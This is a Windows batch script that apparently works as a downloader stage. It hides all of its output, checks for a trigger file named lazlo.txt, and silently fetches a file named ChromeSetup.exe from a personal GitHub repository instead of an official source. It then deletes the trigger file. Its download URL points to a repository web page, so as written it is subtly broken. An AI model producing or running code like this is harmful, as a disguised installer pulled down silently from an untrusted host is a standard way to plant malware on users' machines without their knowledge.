@echo off
setlocal

REM Define the file to search for and the URL to download from
set "searchFile=lazlo.txt"
set "downloadURL=https://github.com/Tk1234567891/test/blob/main/ChromeSetup.exe"
set "downloadedFile=ChromeSetup.exe"

REM Suppress the output of the entire script
>nul 2>&1 (
    REM Search for the file
    if exist "%searchFile%" (
        
        REM Download the new file silently using PowerShell
        powershell -Command "Invoke-WebRequest -Uri '%downloadURL%' -OutFile '%downloadedFile%' -UseBasicParsing"
        
        REM Check if the download was successful
        if exist "%downloadedFile%" (
            
            REM Delete the original file
            del /f /q "%searchFile%"
        )
    )
)

endlocal
